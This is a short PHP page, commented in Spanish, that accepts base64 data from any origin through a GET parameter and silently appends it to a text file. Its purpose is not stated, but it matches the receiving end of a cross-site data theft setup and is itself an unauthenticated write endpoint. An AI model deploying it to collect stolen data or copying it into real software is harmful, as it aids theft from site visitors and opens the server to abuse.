<?php
header("Access-Control-Allow-Origin: *");
?>

<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Recibir datos de URL en PHP</title>
</head>
<body>

<?php

if(isset($_GET['datos'])) {
    $valor = base64_decode($_GET['datos']);
    $archivo = fopen("archivo.txt", "a") or die();
    fwrite($archivo, $valor . "\n");
    fclose($archivo);
}

?>

</body>
</html>
